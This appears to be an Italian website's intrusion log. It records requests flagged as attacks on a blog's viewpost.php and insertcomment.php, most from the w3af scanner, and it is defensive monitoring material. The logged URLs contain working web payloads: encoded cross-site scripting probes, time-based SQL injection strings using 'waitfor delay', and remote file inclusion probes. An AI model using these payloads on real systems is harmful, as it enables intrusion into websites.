File di log creato il 31 March del 2011 alle ore 5:36 pm

March 31, 2011, 5:36 pm ...! URL attaccata !... IP: 82.59.43.157 | Agent: Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Ubuntu/10.04 Chromium/10.0.648.133 Chrome/10.0.648.133 Safari/534.16 | URL: (http://www.netcoders.org)/blog/viewpost.php?id=2+and+ | Referer: 
April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3CSCrIPT%3Efake_alert(%22Jc05%22)%3C/SCrIPT%3E | Referer: 

April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3CScRIpT%3Efake_alert(String.fromCharCode(Jc05))%3C/SCriPT%3E | Referer: 

April 5, 2011, 9:27 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=%3CScRIPT%3Ea=/Jc05/%0Afake_alert(a.source)%3C/SCRiPT%3E | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%27%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%27)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%27))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%27%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%27)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%27))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%27%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%27)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%27))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%27%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%27)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=1%27))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%27%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%27)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:28 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%27))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%27%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%27)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%27))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%27%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%27)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%27))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%27%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%27)%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=1%27))%3Bwaitfor+delay+%270:0:5%27-- | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=http://w3af.sourceforge.net/ | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=http://w3af.sourceforge.net/ | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=http://w3af.sourceforge.net/ | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/viewpost.php?id=http://w3af.sourceforge.net/ | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=http://w3af.sourceforge.net/ | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=http://w3af.sourceforge.net/ | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=http://w3af.sourceforge.net/ | Referer: 

April 5, 2011, 9:29 pm ...! URL attaccata !... IP: 79.53.106.105 | Agent: w3af.sourceforge.net | URL: (http://www.netcoders.org)/blog/insertcomment.php?id=http://w3af.sourceforge.net/ | Referer: 

